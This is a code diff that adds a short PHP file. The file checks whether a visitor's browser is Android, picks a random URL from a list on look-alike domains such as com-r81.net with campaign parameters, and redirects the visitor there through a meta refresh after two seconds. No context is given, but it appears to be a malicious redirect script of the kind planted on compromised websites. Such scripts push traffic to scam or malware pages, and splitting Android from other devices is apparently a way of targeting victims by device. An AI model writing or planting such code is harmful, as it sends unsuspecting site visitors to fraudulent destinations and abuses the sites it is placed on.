@@ -1,0 +1,23 @@
+<?php
+
+$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
+$android_urls = array (
+			'http://com-r81.net/svpp.php?a=314759&c=wl_con&s=23AND',
+			'http://com-5fy.net/plwel.php?a=314759&c=wl_con&s=23AND',
+			'http://com-3w1.net/lbmj.php?a=314759&c=wl_con&s=23AND',
+);
+$not_android_urls = array (
+			'http://com-r81.net/mlbbn.php?a=314759&c=wl_con&s=23NF',
+			'http://com-5fy.net/ahru.php?a=314759&c=wl_con&s=23NF',
+			'http://com-3w1.net/nhj.php?a=314759&c=wl_con&s=23NF',
+);
+ $n = mt_rand(0,count($not_android_urls)-1);
+ $rand_url=$not_android_urls[$n];
+ 
+if ( $android  == true)
+{
+ $n = mt_rand(0,count($android_urls)-1);
+ $rand_url=$android_urls[$n];
+}
+?>
+ <meta http-equiv="refresh" content="2; url=<?php echo $rand_url;?> ">
